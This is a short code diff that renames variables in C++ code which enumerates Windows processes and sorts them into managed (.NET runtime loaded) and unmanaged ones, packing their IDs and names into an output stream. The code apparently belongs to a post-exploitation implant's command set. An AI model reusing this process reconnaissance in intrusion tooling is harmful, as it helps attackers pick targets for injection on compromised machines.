@@ -164,19 +164,18 @@ namespace Commands {
             !Ctx->win32.Process32First(snapshot, &entries)) {
             return;
         }
-
         do {
-            BOOL isManaged  = FALSE;
-            BOOL isLoaded   = FALSE;
+            BOOL is_managed  = FALSE;
+            BOOL is_loaded   = FALSE;
 
-            CLIENT_ID Cid           = { };
-            OBJECT_ATTRIBUTES Attr  = { };
+            CLIENT_ID cid           = { };
+            OBJECT_ATTRIBUTES attr  = { };
 
-            Cid.UniqueThread    = nullptr;
-            Cid.UniqueProcess   = R_CAST(HANDLE, entries.th32ProcessID);
+            cid.UniqueThread    = nullptr;
+            cid.UniqueProcess   = R_CAST(HANDLE, entries.th32ProcessID);
 
-            InitializeObjectAttributes(&Attr, nullptr, 0, nullptr, nullptr);
-            if (!NT_SUCCESS(Ctx->Nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &Attr, &Cid))) {
+            InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
+            if (!NT_SUCCESS(Ctx->Nt.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid))) {
                 continue;
             }
 
@@ -184,8 +183,8 @@ namespace Commands {
                 if (SUCCEEDED((meta)->lpVtbl->EnumerateInstalledRuntimes(meta, &enums))) {
 
                     while (S_OK == enums->Next(0x1, R_CAST(IUnknown**, &runtime), nullptr)) {
-                        if (runtime->lpVtbl->IsLoaded(runtime, process, &isLoaded) == S_OK && isLoaded == TRUE) {
-                            isManaged = TRUE;
+                        if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {
+                            is_managed = TRUE;
 
                             if (Type == MANAGED_PROCESS && SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &Size))) {
                                 Stream::PackDword(out, entries.th32ProcessID);
@@ -198,7 +197,7 @@ namespace Commands {
                 }
             }
 
-            if (!isManaged && Type == UNMANAGED_PROCESS) {
+            if (!is_managed && Type == UNMANAGED_PROCESS) {
                 Stream::PackDword(out, entries.th32ProcessID);
                 Stream::PackString(out, entries.szExeFile);
             }
